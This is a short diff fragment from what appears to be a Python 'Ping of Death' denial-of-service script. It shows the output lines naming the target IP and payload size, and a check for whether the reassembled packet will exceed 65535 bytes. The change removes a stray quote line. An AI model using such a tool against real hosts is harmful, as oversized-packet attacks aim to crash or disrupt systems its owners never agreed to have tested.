@@ -76,7 +76,7 @@ def main():
     # Anything above 65507 causes the reassembled IP datagram to exceed 65535.
     print(f"[*] Ping of Death -> {target_ip}")
     print(f"[*] Payload size:  {payload_size} bytes")
-'''
+    
     if payload_size > 65507:
         print("[*] Reassembled packet will EXCEED 65535 bytes (classic PoD)")
     else:
